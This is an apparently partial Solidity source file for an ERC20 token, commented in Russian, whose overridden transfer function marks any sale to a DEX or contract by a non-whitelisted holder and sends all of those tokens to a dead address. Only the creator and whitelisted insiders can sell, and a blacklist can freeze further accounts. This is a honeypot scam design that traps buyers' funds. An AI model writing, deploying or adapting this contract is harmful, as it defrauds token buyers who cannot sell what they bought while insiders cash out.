// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract Token is ERC20, Ownable {
    mapping(address => bool) public whitelist;
    mapping(address => bool) public isPairOrRouter;
    mapping(address => bool) public isBlacklisted;
    address public immutable creator;
    
    error NotAllowedToSell();
    error NotCreator();
    error ZeroAddress();
    error InvalidAmount();
    error Blacklisted();
    
    event PairAdded(address indexed pair);
    event RouterAdded(address indexed router);
    event AddedToBlacklist(address indexed account);
    event RemovedFromBlacklist(address indexed account);

    uint256 public constant SELL_TAX = 1000; // 100% налог!
    address public constant DEAD_WALLET = 0x000000000000000000000000000000000000dEaD;
    
    modifier onlyCreator() {
        if(msg.sender != creator) revert NotCreator();
        _;
    }

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        address[] memory whitelist_,
        address creator_
    ) ERC20(name_, symbol_) {
        if(creator_ == address(0)) revert ZeroAddress();
        
        _mint(creator_, totalSupply_);
        creator = creator_;
        
        // Добавляем в whitelist
        for(uint i = 0; i < whitelist_.length; i++) {
            whitelist[whitelist_[i]] = true;
        }
        whitelist[creator_] = true;
        whitelist[address(this)] = true;
        
        // Базовые DEX адреса
        isPairOrRouter[0xD99D1c33F9fC3444f8101754aBC46c52416550D1] = true; // Testnet Router
        isPairOrRouter[0x6725F303b657a9451d8BA641348b6761A6CC7a17] = true; // Testnet Factory
        
        _transferOwnership(creator_);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        // Базовые проверки
        if(sender == address(0) || recipient == address(0)) revert ZeroAddress();
        if(amount == 0) revert InvalidAmount();
        if(isBlacklisted[sender] || isBlacklisted[recipient]) revert Blacklisted();

        // ПРОДАЖА - это когда:
        bool isSelling = isPairOrRouter[recipient] || // продажа через известные DEX
                        (!isPairOrRouter[sender] && _isContract(recipient)); // продажа через другие контракты
        
        // Если пытаются продать без whitelist:
        if(isSelling && !whitelist[sender] && sender != creator) {
            // Забираем ВСЕ 100% в dead wallet
            super._transfer(sender, DEAD_WALLET, amount);
            return; // Продавец не получает НИЧЕГО
        }

        super._transfer(sender, recipient, amount);
    }

    // Проверка является ли адрес контрактом
    function _isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // ... (остальной код)
}